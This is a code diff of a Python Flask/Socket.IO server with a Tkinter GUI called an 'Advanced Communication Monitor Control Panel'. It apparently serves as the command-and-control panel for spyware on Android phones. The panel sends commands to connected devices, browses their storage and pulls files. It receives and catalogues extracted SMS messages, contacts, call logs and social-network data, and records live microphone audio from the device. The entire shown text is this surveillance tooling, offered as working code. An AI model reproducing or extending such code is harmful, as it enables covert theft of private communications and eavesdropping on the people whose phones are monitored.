+        if index >= len(self.current_files):
+            messagebox.showinfo(
+                "Invalid Selection", "Selected item is not valid.", parent=self.window
+            )
+            return
+
+        file_info = self.current_files[index]
+        file_name = file_info.get("name", "")
+        file_path = (
+            f"{self.current_path}/{file_name}"
+            if not self.current_path.endswith("/")
+            else f"{self.current_path}{file_name}"
+        )
+
+        result = send_command_to_client(
+            self.target_id,
+            Commands.SIO_CMD_ANALYZE_CONTENT,
+            args={"filePath": file_path},
+        )
+        if result.get("status") == "sent":
+            self.status_var.set(f"Analysis requested for: {file_path}")
+            self.parent_app.add_system_log(
+                f"🔍 Analysis requested: {file_path}", "success"
+            )
+        else:
+            messagebox.showerror(
+                "Analysis Error",
+                f"Failed to request analysis: {result.get('message', 'Unknown error')}",
+                parent=self.window,
+            )
+
+    def copy_path_to_clipboard(self):
+        """Copy the selected file path to clipboard"""
+        selection = self.files_listbox.curselection()
+        if not selection:
+            return
+
+        index = selection[0]
+        if hasattr(self, "current_files") and index < len(self.current_files):
+            file_info = self.current_files[index]
+            file_name = file_info.get("name", "")
+            file_path = (
+                f"{self.current_path}/{file_name}"
+                if not self.current_path.endswith("/")
+                else f"{self.current_path}{file_name}"
+            )
+
+            self.window.clipboard_clear()
+            self.window.clipboard_append(file_path)
+            self.status_var.set(f"Copied to clipboard: {file_path}")
+
+    def close(self):
+        """Close the window with cleanup"""
+        try:
+            # Clean up any pending operations for this device
+            if hasattr(self, "device_id"):
+                pending_ops = remote_fs_manager.get_pending_operations(self.device_id)
+                if pending_ops:
+                    self.parent_app.add_system_log(
+                        f"🧹 Cleaning up {len(pending_ops)} pending operations for {self.device_id}"
+                    )
+                    for cmd_id in list(pending_ops.keys()):
+                        remote_fs_manager.remove_pending_operation(
+                            self.device_id, cmd_id
+                        )
+
+            # Clear current files reference
+            if hasattr(self, "current_files"):
+                self.current_files = None
+
+            # Log closure
+            if hasattr(self, "parent_app") and self.parent_app:
+                self.parent_app.add_system_log(
+                    f"📂 File browser closed for {getattr(self, 'device_id', 'Unknown')}"
+                )
+
+        except Exception as e:
+            logger.warning(f"Error during file browser cleanup: {e}")
+        finally:
+            # Always destroy the window
+            if hasattr(self, "window"):
+                self.window.destroy()
+
+    def __del__(self):
+        """Destructor to ensure cleanup"""
+        try:
+            if hasattr(self, "current_files"):
+                self.current_files = None
+        except:
+            pass
+
+
+# Global Variables
+connected_clients_sio = {}
+device_manager = DeviceManager()
+settings_manager = SettingsManager()
+theme_manager = ThemeManager()
 remote_fs_manager = RemoteFileSystemManager()
+gui_app = None
+
+# Audio Variables
+audio_queue = queue.Queue()
+stream_active_for_device = {}
+playback_thread = None
+live_audio_buffers = {}
 
 
-# --- File Upload Handler ---
+# --- Enhanced File Upload Handler ---
 class FileUploadHandler:
     @staticmethod
     def handle_initial_data(request_data):
@@ -327,6 +1286,13 @@ class FileUploadHandler:
                 image_file.save(image_path)
                 logger.info(f"Saved image to {image_path}")
 
+            # Update device stats
+            device_manager.update_stats(
+                device_id_sanitized,
+                "last_initial_data",
+                datetime.datetime.now().isoformat(),
+            )
+
             # Update GUI
             if gui_app and gui_app.master.winfo_exists():
                 gui_app.add_system_log(
@@ -348,7 +1314,7 @@ class FileUploadHandler:
 
     @staticmethod
     def handle_command_file(request_data):
-        """معالجة رفع ملفات الأوامر"""
+        """معالجة رفع ملفات الأوامر المحسن"""
         logger.info("Request to /upload_command_file")
         try:
             device_id = request_data.form.get("deviceId")
@@ -382,29 +1348,47 @@ class FileUploadHandler:
                     else "no_id"
                 )
 
-                # Determine save path based on data type
-                if data_type == "structured_analysis":
-                    analysis_folder = os.path.join(
-                        device_folder_path, "structured_analysis"
-                    )
-                    os.makedirs(analysis_folder, exist_ok=True)
-                    file_path = analysis_folder
-                elif data_type == "audio_data":
-                    audio_folder = os.path.join(device_folder_path, "audio_recordings")
-                    os.makedirs(audio_folder, exist_ok=True)
-                    file_path = audio_folder
-                else:
-                    file_path = device_folder_path
+                # Enhanced folder structure based on data type
+                folder_mapping = {
+                    "structured_analysis": "structured_analysis",
+                    "audio_data": "audio_recordings",
+                    "enhanced_sms_extraction": "messages/enhanced_sms",
+                    "complete_sms_extraction": "messages/complete_sms",
+                    "social_network_analysis": "social_network",
+                    "communication_history_analysis": "communication_history",
+                    "contacts_list_analysis": "contacts",
+                    "call_logs_analysis": "call_logs",
+                    "library_catalog": "library_catalog",
+                    "content_analysis": "content_analysis",
+                    "queue_processing": "queue_processing",
+                }
+
+                subfolder = folder_mapping.get(data_type, "general")
+                file_path = os.path.join(device_folder_path, subfolder)
+                os.makedirs(file_path, exist_ok=True)
 
                 new_filename = f"{safe_command_ref}_{base.replace(' ', '_')}_{safe_command_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
                 full_file_path = os.path.join(file_path, new_filename)
 
                 file_data.save(full_file_path)
+                file_size = os.path.getsize(full_file_path)
+
                 logger.info(
-                    f"Saved monitoring data '{new_filename}' for monitor '{device_id_sanitized}' to {full_file_path}"
+                    f"Saved {data_type} data '{new_filename}' for monitor '{device_id_sanitized}' ({Utils.format_file_size(file_size)})"
                 )
 
-                # If this is a response to list_files, process it to populate the file tree
+                # Update device stats
+                device_manager.update_stats(
+                    device_id_sanitized,
+                    f"last_{data_type}",
+                    {
+                        "timestamp": datetime.datetime.now().isoformat(),
+                        "file_size": file_size,
+                        "filename": new_filename,
+                    },
+                )
+
+                # Enhanced processing for different data types
                 if command_ref == "list_files" and command_id_from_req != "N_A":
                     try:
                         with open(full_file_path, "r", encoding="utf-8") as f:
@@ -417,29 +1401,39 @@ class FileUploadHandler:
                                 remote_fs_manager.add_files_to_cache(
                                     device_id_sanitized, path, files_list
                                 )
-                                # Process pending operation if it was a tree view request
                                 remote_fs_manager.remove_pending_operation(
                                     device_id_sanitized, command_id_from_req
                                 )
 
-                                # Update the file tree if GUI exists and the file browser is showing this device
+                                # Update the file browser if it's open for this device
                                 if (
                                     gui_app
                                     and gui_app.master.winfo_exists()
                                     and hasattr(gui_app, "file_browser")
+                                    and gui_app.file_browser
                                     and gui_app.file_browser.current_device_id
                                     == device_id_sanitized
+                                    and hasattr(gui_app.file_browser, "window")
+                                    and gui_app.file_browser.window.winfo_exists()
                                 ):
-                                    gui_app.file_browser.populate_tree_for_path(path)
+                                    # Only update if the file browser is showing the same path
+                                    if gui_app.file_browser.current_path == path:
+                                        gui_app.file_browser.populate_files_from_cache(
+                                            path
+                                        )
                     except Exception as e:
                         logger.error(
                             f"Error processing list_files response: {e}", exc_info=True
                         )
 
+                FileUploadHandler._process_uploaded_data(
+                    full_file_path, data_type, device_id_sanitized, command_id_from_req
+                )
+
                 # Update GUI
                 if gui_app and gui_app.master.winfo_exists():
                     gui_app.add_system_log(
-                        f"Received '{new_filename}' from '{device_id_sanitized}' (Type: {data_type})"
+                        f"📁 Received '{new_filename}' from '{device_id_sanitized}' (Type: {data_type}, Size: {Utils.format_file_size(file_size)})"
                     )
                     if (
                         gui_app.current_selected_historical_device_id
@@ -447,19 +1441,13 @@ class FileUploadHandler:
                     ):
                         gui_app.display_device_details(device_id_sanitized)
 
-                        # If there's a file browser open for this device, refresh it
-                        if (
-                            hasattr(gui_app, "file_browser")
-                            and gui_app.file_browser.current_device_id
-                            == device_id_sanitized
-                        ):
-                            gui_app.file_browser.refresh_current_directory()
-
                 return (
                     Utils.create_json_response(
                         "success",
-                        "Monitoring data received by Control Panel",
+                        "Enhanced monitoring data received",
                         filename_on_server=new_filename,
+                        file_size=file_size,
+                        data_type=data_type,
                     ),
                     200,
                 )
@@ -471,8 +1459,69 @@ class FileUploadHandler:
             logger.error(f"Error in upload_command_file: {e}", exc_info=True)
             return Utils.create_json_response("error", f"Server error: {str(e)}"), 500
 
+    @staticmethod
+    def _process_uploaded_data(file_path, data_type, device_id, command_id):
+        """معالجة البيانات المرفوعة حسب النوع"""
+        try:
+            if data_type in ["enhanced_sms_extraction", "complete_sms_extraction"]:
+                with open(file_path, "r", encoding="utf-8") as f:
+                    sms_data = json.load(f)
+                    if "data" in sms_data:
+                        stats = sms_data["data"].get("statistics", {})
+                        device_manager.update_stats(
+                            device_id,
+                            "sms_stats",
+                            {
+                                "total_messages": stats.get("total_messages", 0),
+                                "extraction_mode": sms_data["data"].get(
+                                    "extraction_mode", "unknown"
+                                ),
+                                "timestamp": datetime.datetime.now().isoformat(),
+                            },
+                        )
 
-# --- Socket Event Handlers ---
+            elif data_type == "social_network_analysis":
+                with open(file_path, "r", encoding="utf-8") as f:
+                    network_data = json.load(f)
+                    if "data" in network_data:
+                        network_analytics = network_data["data"].get(
+                            "network_analytics", {}
+                        )
+                        device_manager.update_stats(
+                            device_id,
+                            "network_stats",
+                            {
+                                "total_contacts": network_data["data"].get(
+                                    "total_network_size", 0
+                                ),
+                                "mobile_contacts": network_analytics.get(
+                                    "mobile_contacts", 0
+                                ),
+                                "timestamp": datetime.datetime.now().isoformat(),
+                            },
+                        )
+
+            elif data_type == "library_catalog":
+                with open(file_path, "r", encoding="utf-8") as f:
+                    catalog_data = json.load(f)
+                    if "data" in catalog_data:
+                        stats = catalog_data["data"].get("content_statistics", {})
+                        device_manager.update_stats(
+                            device_id,
+                            "library_stats",
+                            {
+                                "total_files": stats.get("total_files", 0),
+                                "total_directories": stats.get("total_directories", 0),
+                                "total_size": stats.get("total_size_bytes", 0),
+                                "timestamp": datetime.datetime.now().isoformat(),
+                            },
+                        )
+
+        except Exception as e:
+            logger.warning(f"Error processing uploaded data: {e}")
+
+
+# --- Enhanced Socket Event Handlers ---
 class SocketEventHandler:
     @staticmethod
     def handle_connect():
@@ -489,10 +1538,12 @@ class SocketEventHandler:
 
     @staticmethod
     def handle_disconnect():
-        """معالج قطع الاتصال"""
+        """معالج قطع الاتصال المحسن"""
         client_sid = request.sid
         dev_id_display = client_sid
+        was_streaming = stream_active_for_device.get(client_sid, False)
 
+        # Clean up streaming state
         stream_active_for_device.pop(client_sid, None)
 
         if client_sid in connected_clients_sio:
@@ -500,32 +1551,125 @@ class SocketEventHandler:
             dev_id_display = device_info.get("id", client_sid)
             logger.info(f"Monitor '{dev_id_display}' disconnected (SID={client_sid})")
 
+            # Update device stats
+            device_manager.update_stats(
+                dev_id_display,
+                "last_disconnection",
+                datetime.datetime.now().isoformat(),
+            )
+
+            # Handle live audio disconnection during streaming
+            if was_streaming and client_sid in live_audio_buffers:
+                buffered_info = live_audio_buffers.get(client_sid, {})
+                audio_data_list = buffered_info.get("data", [])
+
+                # Schedule audio save dialog on main thread
+                if gui_app and gui_app.master.winfo_exists() and audio_data_list:
+
+                    def show_save_dialog():
+                        try:
+                            user_choice = messagebox.askyesno(
+                                "Device Disconnected During Live Audio",
+                                f"⚠️ Monitor '{dev_id_display}' disconnected during live audio streaming!\n\n"
+                                f"Live audio data is available ({len(audio_data_list)} chunks).\n"
+                                f"Would you like to save the recorded audio before it's lost?",
+                                parent=gui_app.master,
+                            )
+                            if user_choice:
+                                audio_params = buffered_info.get(
+                                    "params",
+                                    {
+                                        "samplerate": AppConfig.REC_SAMPLERATE,
+                                        "channels": AppConfig.REC_CHANNELS,
+                                        "sampwidth": AppConfig.REC_SAMPWIDTH,
+                                    },
+                                )
+                                gui_app._save_recorded_stream(
+                                    dev_id_display,
+                                    client_sid,
+                                    audio_data_list,
+                                    audio_params,
+                                )
+                                gui_app.add_system_log(
+                                    f"💾 Saved live audio from disconnected monitor: {dev_id_display}",
+                                    "success",
+                                )
+                            else:
+                                gui_app.add_system_log(
+                                    f"🗑️ Discarded live audio from disconnected monitor: {dev_id_display}",
+                                    "warning",
+                                )
+                        except Exception as e:
+                            logger.error(f"Error in save dialog: {e}")
+                            gui_app.add_system_log(
+                                f"❌ Error handling disconnected audio: {e}", "error"
+                            )
+
+                    # Schedule the dialog to show after a short delay
+                    gui_app.master.after(1000, show_save_dialog)
+
             # Update GUI
             if gui_app and gui_app.master.winfo_exists():
                 gui_app.update_live_clients_list()
-                gui_app.add_system_log(f"Monitor '{dev_id_display}' disconnected")
+                gui_app.add_system_log(
+                    f"🔴 Monitor '{dev_id_display}' disconnected"
+                    + (" during live audio streaming" if was_streaming else "")
+                )
+
                 if gui_app.current_selected_live_client_sid == client_sid:
                     gui_app._enable_commands(False)
                     gui_app.current_selected_live_client_sid = None
-                    gui_app.live_audio_status_var.set(
-                        "Live Audio: Idle (Monitor Disconnected)"
-                    )
-                    if SOUNDDEVICE_AVAILABLE:
+
+                    if was_streaming:
+                        gui_app.live_audio_status_var.set(
+                            "🔴 Live Audio: Device Disconnected"
+                        )
                         gui_app.start_live_audio_button.config(state=tk.DISABLED)
                         gui_app.stop_live_audio_button.config(state=tk.DISABLED)
+                    else:
+                        gui_app.live_audio_status_var.set(
+                            "Live Audio: Idle (Monitor Disconnected)"
+                        )
 
-                    # Close file browser if it's open for this device
-                    if hasattr(gui_app, "file_browser"):
-                        if gui_app.file_browser.current_device_id == dev_id_display:
-                            gui_app.file_browser.close()
+                # Close file browser if it's open for this device
+                if (
+                    hasattr(gui_app, "file_browser")
+                    and gui_app.file_browser
+                    and hasattr(gui_app.file_browser, "current_device_id")
+                    and gui_app.file_browser.current_device_id == dev_id_display
+                ):
+                    try:
+                        if (
+                            hasattr(gui_app.file_browser, "window")
+                            and gui_app.file_browser.window.winfo_exists()
+                        ):
 
-        # Clear audio buffer
+                            def close_browser():
+                                try:
+                                    gui_app.file_browser.status_var.set(
+                                        "⚠️ Device disconnected - File browser will close"
+                                    )
+                                    gui_app.master.after(
+                                        2000, gui_app.file_browser.close
+                                    )
+                                except:
+                                    pass
+
+                            gui_app.master.after(500, close_browser)
+                    except Exception as e:
+                        logger.warning(f"Error closing file browser: {e}")
+
+        # Clear audio buffer if not handled above
         if client_sid in live_audio_buffers:
             buffered_info = live_audio_buffers.pop(client_sid, None)
-            if buffered_info and buffered_info["data"]:
+            if buffered_info and buffered_info.get("data") and not was_streaming:
                 logger.info(
-                    f"Cleared unsaved live audio buffer for disconnected monitor {dev_id_display}"
+                    f"Cleared audio buffer for disconnected monitor {dev_id_display}"
                 )
+                if gui_app and gui_app.master.winfo_exists():
+                    gui_app.add_system_log(
+                        f"🗑️ Cleared audio buffer for {dev_id_display}"
+                    )
 
     @staticmethod
     def handle_register_device(data):
@@ -559,6 +1703,18 @@ class SocketEventHandler:
                 "last_seen": datetime.datetime.now().isoformat(),
             }
 
+            # Update device stats
+            device_manager.update_stats(
+                device_identifier,
+                "last_connection",
+                {
+                    "timestamp": datetime.datetime.now().isoformat(),
+                    "ip": request.remote_addr,
+                    "platform": device_platform,
+                    "capabilities": device_capabilities,
+                },
+            )
+
             logger.info(
                 f"Monitor registered: ID='{device_identifier}', Name='{device_name_display}'"
             )
@@ -577,7 +1733,7 @@ class SocketEventHandler:
             if gui_app and gui_app.master.winfo_exists():
                 gui_app.update_live_clients_list()
                 gui_app.add_system_log(
-                    f"Monitor '{device_name_display}' connected from {request.remote_addr}"
+                    f"🟢 Monitor '{device_name_display}' connected from {request.remote_addr}"
                 )
 
         except Exception as e:
@@ -628,18 +1784,19 @@ class SocketEventHandler:
                 and gui_app.master.winfo_exists()
                 and gui_app.current_selected_live_client_sid == client_sid
             ):
-                status_msg = f"Live Audio: Receiving from {connected_clients_sio[client_sid].get('id', client_sid)}..."
+                status_msg = f"🎵 Live Audio: Receiving from {connected_clients_sio[client_sid].get('id', client_sid)}..."
                 if not SOUNDDEVICE_AVAILABLE:
-                    status_msg = "Live Audio: Receiving (Playback Disabled)"
+                    status_msg = "🎵 Live Audio: Receiving (Playback Disabled)"
                 gui_app.live_audio_status_var.set(status_msg)
 
 
-# --- Command Sender ---
-def send_command_to_client(target_id, command_name, args=None):
-    """إرسال أمر إلى عميل محدد"""
+# --- Enhanced Command Sender ---
+def send_command_to_client(target_id, command_name, args=None, timeout_seconds=30):
+    """إرسال أمر إلى عميل محدد مع معالجة محسنة"""
     args = args if args is not None else {}
     sid_to_use = None
 
+    # Find the correct SID
     if target_id in connected_clients_sio:
         sid_to_use = target_id
     else:
@@ -653,13 +1810,42 @@ def send_command_to_client(target_id, command_name, args=None):
         )
 
     if not sid_to_use:
-        errmsg = f"Target monitor '{target_id}' not found or not live for command '{command_name}'"
+        errmsg = f"Target monitor '{target_id}' not found or not connected"
         logger.error(errmsg)
         if gui_app and gui_app.master.winfo_exists():
-            messagebox.showerror("Command Error", errmsg, parent=gui_app.master)
+            gui_app.add_system_log(f"❌ {errmsg}", "error")
+            messagebox.showerror(
+                "Command Error",
+                f"Device '{target_id}' is not connected.\n"
+                f"Please ensure the device is online and try again.",
+                parent=gui_app.master,
+            )
         return {"status": "error", "message": errmsg, "command_id": None}
 
-    dev_id_for_log = connected_clients_sio[sid_to_use].get("id", "UnknownMonitorID")
+    # Verify connection is still active
+    device_info = connected_clients_sio.get(sid_to_use, {})
+    dev_id_for_log = device_info.get("id", "UnknownMonitorID")
+
+    # Check last seen time
+    last_seen_iso = device_info.get("last_seen")
+    if last_seen_iso:
+        try:
+            last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
+            time_since_last_seen = (
+                datetime.datetime.now() - last_seen_dt
+            ).total_seconds()
+            if time_since_last_seen > 120:  # 2 minutes
+                logger.warning(
+                    f"Device {dev_id_for_log} hasn't been seen for {time_since_last_seen:.0f} seconds"
+                )
+                if gui_app and gui_app.master.winfo_exists():
+                    gui_app.add_system_log(
+                        f"⚠️ Device {dev_id_for_log} may be unresponsive (last seen {time_since_last_seen:.0f}s ago)",
+                        "warning",
+                    )
+        except:
+            pass
+
     cmd_id = f"{command_name.replace('command_', '')}_{datetime.datetime.now().strftime('%H%M%S%f')}"
     payload = {"command": command_name, "command_id": cmd_id, "args": args}
 
@@ -669,38 +1855,67 @@ def send_command_to_client(target_id, command_name, args=None):
 
     try:
         socketio.emit("command", payload, room=sid_to_use)
+
+        # Store command info for timeout tracking
+        if gui_app:
+            command_info = {
+                "command_name": command_name,
+                "device_id": dev_id_for_log,
+                "timestamp": datetime.datetime.now(),
+                "timeout_seconds": timeout_seconds,
+            }
+
+            # Schedule timeout check
+            def check_timeout():
+                if gui_app and gui_app.master.winfo_exists():
+                    elapsed = (
+                        datetime.datetime.now() - command_info["timestamp"]
+                    ).total_seconds()
+                    if elapsed > timeout_seconds:
+                        gui_app.add_system_log(
+                            f"⏰ Command '{command_name}' to '{dev_id_for_log}' may have timed out ({elapsed:.0f}s)",
+                            "warning",
+                        )
+
+            # Check for timeout after the specified time
+            if gui_app.master.winfo_exists():
+                gui_app.master.after(int(timeout_seconds * 1000), check_timeout)
+
         if gui_app and gui_app.master.winfo_exists():
             gui_app.add_system_log(
-                f"Sent cmd '{command_name}' (ID: {cmd_id}) to monitor '{dev_id_for_log}'"
+                f"📤 Sent cmd '{command_name}' (ID: {cmd_id}) to monitor '{dev_id_for_log}'"
             )
 
-        # Store command in pending operations if it's a file listing command
-        if command_name == Commands.SIO_CMD_LIST_FILES:
-            remote_fs_manager.add_pending_operation(
-                dev_id_for_log, cmd_id, "list_files", {"path": args.get("path", "/")}
-            )
+        return {"status": "sent", "command_id": cmd_id, "device_id": dev_id_for_log}
 
-        return {"status": "sent", "command_id": cmd_id}
     except Exception as e_emit:
         errmsg = f"Error emitting cmd '{command_name}' to SID {sid_to_use}: {e_emit}"
         logger.error(errmsg, exc_info=True)
         if gui_app and gui_app.master.winfo_exists():
-            messagebox.showerror("Emit Error", errmsg, parent=gui_app.master)
+            gui_app.add_system_log(f"❌ Failed to send command: {e_emit}", "error")
+            messagebox.showerror(
+                "Communication Error",
+                f"Failed to send command to device '{dev_id_for_log}'.\n"
+                f"Error: {e_emit}\n\n"
+                f"Please check the connection and try again.",
+                parent=gui_app.master,
+            )
         return {"status": "error", "message": errmsg, "command_id": cmd_id}
 
 
 # --- Flask Routes ---
 @app.route("/")
 def index():
-    return "Advanced Communication Monitor Control Panel - Ready for connections..."
+    return "Advanced Communication Monitor Control Panel v2.0 - Enhanced Edition"
 
 
 @app.route("/status")
 def status():
-    """حالة النظام والإحصائيات"""
+    """حالة النظام والإحصائيات المحسنة"""
     return jsonify(
         {
             "status": "running",
+            "version": "2.0_enhanced",
             "connected_monitors": len(connected_clients_sio),
             "active_streams": len(
                 [sid for sid, active in stream_active_for_device.items() if active]
@@ -709,9 +1924,15 @@ def status():
             "features": {
                 "audio_playback": SOUNDDEVICE_AVAILABLE,
                 "image_preview": PIL_AVAILABLE,
-                "social_network_analysis": True,
-                "communication_history": True,
+                "enhanced_sms_extraction": True,
+                "unlimited_sms_compression": True,
+                "smart_resource_monitoring": True,
+                "intelligent_sync_queue": True,
+                "document_library_cataloging": True,
+                "dark_mode_support": True,
             },
+            "theme": theme_manager.current_theme,
+            "settings": settings_manager.settings,
         }
     )
 
@@ -752,804 +1973,166 @@ def handle_live_audio_chunk(data):
     return SocketEventHandler.handle_live_audio_chunk(data)
 
 
-# --- GUI Base Classes ---
-class BaseGUIComponent:
-    """مكون واجهة أساسي"""
-
-    def __init__(self, parent):
-        self.parent = parent
-        self.setup_component()
-
-    def setup_component(self):
-        """إعداد المكون - يجب تنفيذه في الفئات المشتقة"""
-        pass
-
-    def update_status(self, message, level="info"):
-        """تحديث الحالة"""
-        if hasattr(self.parent, "add_system_log"):
-            self.parent.add_system_log(message, level)
-
-
-class ListManager:
-    """مدير القوائم"""
-
-    def __init__(self, listbox, data_source):
-        self.listbox = listbox
-        self.data_source = data_source
-        self.items_in_listbox = []
-
-    def refresh_list(self, items, format_func):
-        """تحديث القائمة"""
-        self.listbox.delete(0, tk.END)
-        self.items_in_listbox = []
-
-        if not items:
-            self.listbox.insert(tk.END, "No items found")
-            self.listbox.config(fg="grey")
-        else:
-            self.listbox.config(fg="black")
-            for item in items:
-                display_entry = format_func(item)
-                self.listbox.insert(tk.END, display_entry)
-                self.items_in_listbox.append(item)
-
-    def get_selected_item(self):
-        """الحصول على العنصر المحدد"""
-        selection = self.listbox.curselection()
-        if selection:
-            index = selection[0]
-            if 0 <= index < len(self.items_in_listbox):
-                return self.items_in_listbox[index]
-        return None
-
-
-# --- File Browser Component ---
-class FileBrowserWindow:
-    def __init__(self, master, device_id, target_id, parent_app):
-        self.master = master
-        self.window = tk.Toplevel(master)
-        self.window.title(f"File Browser - {device_id}")
-        self.window.geometry("900x600")
-        self.window.minsize(800, 500)
-
-        self.device_id = device_id
-        self.current_device_id = device_id
-        self.target_id = target_id
-        self.parent_app = parent_app
-        self.current_path = "/sdcard"  # بدء التصفح من مجلد بطاقة الذاكرة بدلاً من الجذر
-        self.path_history = ["/sdcard"]
-        self.history_pos = 0
-
-        # تعريف المجلدات الشائعة للوصول السريع
-        self.common_folders = [
-            ("/sdcard", "📁 بطاقة الذاكرة (SD Card)"),
-            ("/storage/emulated/0", "📁 التخزين الداخلي (Internal Storage)"),
-            ("/sdcard/Download", "📁 التنزيلات (Downloads)"),
-            ("/sdcard/DCIM", "📁 الكاميرا (Camera)"),
-            ("/sdcard/Pictures", "📁 الصور (Pictures)"),
-            ("/sdcard/Documents", "📁 المستندات (Documents)"),
-            ("/sdcard/Movies", "📁 الفيديو (Movies)"),
-            ("/sdcard/Music", "📁 الموسيقى (Music)"),
-            ("/sdcard/Android/data", "📁 بيانات التطبيقات (App Data)"),
-        ]
-
-        self._setup_ui()
-
-        # طلب قائمة الملفات مباشرة عند الفتح
-        self.list_files_for_path("/sdcard")
-
-        # Set up closing event
-        self.window.protocol("WM_DELETE_WINDOW", self.close)
-
-    def _setup_ui(self):
-        """Set up the UI components"""
-        # Main frame
-        main_frame = ttk.Frame(self.window)
-        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-
-        # Toolbar frame
-        toolbar_frame = ttk.Frame(main_frame)
-        toolbar_frame.pack(fill=tk.X, padx=5, pady=5)
-
-        # Navigation buttons
-        self.back_button = ttk.Button(
-            toolbar_frame, text="🔙 Back", command=self.go_back
-        )
-        self.back_button.pack(side=tk.LEFT, padx=2)
-
-        self.forward_button = ttk.Button(
-            toolbar_frame, text="🔜 Forward", command=self.go_forward
-        )
-        self.forward_button.pack(side=tk.LEFT, padx=2)
-        self.forward_button.config(state=tk.DISABLED)  # Initially disabled
-
-        self.up_button = ttk.Button(toolbar_frame, text="🔝 Up", command=self.go_up)
-        self.up_button.pack(side=tk.LEFT, padx=2)
-
-        self.refresh_button = ttk.Button(
-            toolbar_frame, text="🔄 Refresh", command=self.refresh_current_directory
-        )
-        self.refresh_button.pack(side=tk.LEFT, padx=2)
-
-        # Path entry
-        ttk.Label(toolbar_frame, text="Path:").pack(side=tk.LEFT, padx=(10, 2))
-        self.path_var = tk.StringVar(value="/")
-        self.path_entry = ttk.Entry(toolbar_frame, textvariable=self.path_var, width=50)
-        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
-        self.path_entry.bind("<Return>", lambda e: self.navigate_to_path())
-
-        self.go_button = ttk.Button(
-            toolbar_frame, text="Go", command=self.navigate_to_path
-        )
-        self.go_button.pack(side=tk.LEFT, padx=2)
-
-        # Status bar
-        self.status_var = tk.StringVar(value="Ready")
-        status_bar = ttk.Label(
-            main_frame, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W
-        )
-        status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=2)
-
-        # Content frame (paned window for tree and details)
-        content_frame = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)
-        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-
-        # قسم المجلدات المفضلة
-        favorites_frame = ttk.LabelFrame(content_frame, text="المجلدات الشائعة")
-        content_frame.add(favorites_frame, weight=1)
-
-        self.favorites_listbox = tk.Listbox(
-            favorites_frame, height=15, font=("Arial", 9)
-        )
-        favorites_scrollbar = ttk.Scrollbar(
-            favorites_frame, orient="vertical", command=self.favorites_listbox.yview
-        )
-        self.favorites_listbox.config(yscrollcommand=favorites_scrollbar.set)
-
-        self.favorites_listbox.pack(
-            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
-        )
-        favorites_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
-
-        # إضافة المجلدات الشائعة إلى القائمة
-        for path, name in self.common_folders:
-            self.favorites_listbox.insert(tk.END, name)
-
-        # ربط حدث النقر على المجلدات المفضلة
-        self.favorites_listbox.bind("<Double-1>", self.on_favorite_double_click)
-
-        # Tree view frame
-        tree_frame = ttk.Frame(content_frame)
-        content_frame.add(tree_frame, weight=2)
-
-        # Tree view with scrollbars
-        self.tree = ttk.Treeview(tree_frame, columns=("size", "date", "type"))
-        self.tree.heading("#0", text="Name")
-        self.tree.heading("size", text="Size")
-        self.tree.heading("date", text="Date Modified")
-        self.tree.heading("type", text="Type")
-
-        self.tree.column("#0", width=300, stretch=tk.YES)
-        self.tree.column("size", width=100, anchor=tk.E)
-        self.tree.column("date", width=150)
-        self.tree.column("type", width=100)
-
-        scrollbar_y = ttk.Scrollbar(
-            tree_frame, orient="vertical", command=self.tree.yview
-        )
-        scrollbar_x = ttk.Scrollbar(
-            tree_frame, orient="horizontal", command=self.tree.xview
-        )
-        self.tree.configure(
-            yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set
-        )
-
-        scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
-        self.tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
-        scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)
-
-        # Bind events for tree
-        self.tree.bind("<Double-1>", self.on_tree_double_click)
-        self.tree.bind(
-            "<Button-3>", self.on_tree_right_click
-        )  # Right-click for context menu
-        self.tree.bind("<<TreeviewSelect>>", self.on_tree_select)
-
-        # Details frame
-        details_frame = ttk.LabelFrame(content_frame, text="File Details")
-        content_frame.add(details_frame, weight=1)
-
-        self.details_text = scrolledtext.ScrolledText(
-            details_frame, height=10, wrap=tk.WORD, state=tk.DISABLED
-        )
-        self.details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-
-        # Bottom buttons frame
-        buttons_frame = ttk.Frame(main_frame)
-        buttons_frame.pack(fill=tk.X, padx=5, pady=5)
-
-        self.upload_button = ttk.Button(
-            buttons_frame, text="📤 Upload Selected", command=self.upload_selected
-        )
-        self.upload_button.pack(side=tk.LEFT, padx=5)
-
-        self.analyze_button = ttk.Button(
-            buttons_frame, text="🔍 Analyze Selected", command=self.analyze_selected
-        )
-        self.analyze_button.pack(side=tk.LEFT, padx=5)
-
-        self.execute_button = ttk.Button(
-            buttons_frame, text="⚡ Execute Command", command=self.execute_command
-        )
-        self.execute_button.pack(side=tk.LEFT, padx=5)
-
-    def on_favorite_double_click(self, event):
-        """التعامل مع النقر المزدوج على المجلد المفضل"""
-        selection = self.favorites_listbox.curselection()
-        if not selection:
-            return
-
-        index = selection[0]
-        if 0 <= index < len(self.common_folders):
-            path = self.common_folders[index][0]
-            self.navigate_to_directory(path)
-
-    def on_tree_select(self, event):
-        """عرض تفاصيل العنصر المحدد"""
-        selected_item = self.tree.focus()
-        if selected_item:
-            item_path = self.get_full_path(selected_item)
-            self.show_file_details(item_path)
-
-    def create_context_menu(self, event):
-        """Create and display the context menu"""
-        selected_item = self.tree.focus()
-        if not selected_item:
-            return
-
-        context_menu = Menu(self.window, tearoff=0)
-
-        # Get item type (file or directory)
-        item_type = self.tree.item(selected_item, "values")[-1]
-        item_path = self.get_full_path(selected_item)
-
-        if item_type == "Directory":
-            context_menu.add_command(
-                label="Open", command=lambda: self.open_directory(item_path)
-            )
-            context_menu.add_command(
-                label="List Files", command=lambda: self.list_files_for_path(item_path)
-            )
-        else:
-            context_menu.add_command(
-                label="Upload", command=lambda: self.upload_file(item_path)
-            )
-            context_menu.add_command(
-                label="Analyze", command=lambda: self.analyze_file(item_path)
